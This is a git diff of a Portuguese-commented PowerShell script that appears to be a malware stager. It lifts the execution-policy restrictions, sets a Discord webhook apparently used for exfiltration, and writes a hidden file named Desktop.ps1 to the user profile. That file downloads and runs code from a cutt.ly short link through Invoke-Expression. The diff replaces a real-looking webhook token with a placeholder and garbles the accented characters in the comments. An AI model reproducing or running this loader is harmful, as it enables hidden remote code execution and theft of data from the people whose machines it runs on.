@@ -1,21 +1,21 @@
 # Permitir executar powershell
 Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force
 
-# Define o conteúdo do arquivo PowerShell
-$dc = 'https://discord.com/api/webhooks/1185172334592655371/r9YAVpnfPK_W5z5D4F0WmkdFO6j7Vo7kSofgED4Ntol0ht1z_ZSMTZkJD7KcdoP30J1V'
+# Define o conteï¿½do do arquivo PowerShell
+$dc = 'https://discord.com/api/webhooks/token here'
 $scriptContent = @"
 Start-Sleep -Milliseconds 500
 `$dc = '$dc'
 Invoke-Expression (Invoke-WebRequest -Uri "http://cutt.ly/ClankPT" -UseBasicParsing).Content
 "@
 
-# Obter o diretório do perfil do usuário logado
+# Obter o diretï¿½rio do perfil do usuï¿½rio logado
 $userProfileDir = $env:USERPROFILE
 
-# Caminho completo do arquivo, incluindo o nome e a extensão
+# Caminho completo do arquivo, incluindo o nome e a extensï¿½o
 $filePath = Join-Path -Path $userProfileDir -ChildPath "Desktop.ps1"
 
-# Cria o arquivo com o conteúdo especificado e define o atributo Hidden
+# Cria o arquivo com o conteï¿½do especificado e define o atributo Hidden
 $scriptContent | Out-File -FilePath $filePath -Encoding utf8
 Set-ItemProperty -Path $filePath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
 
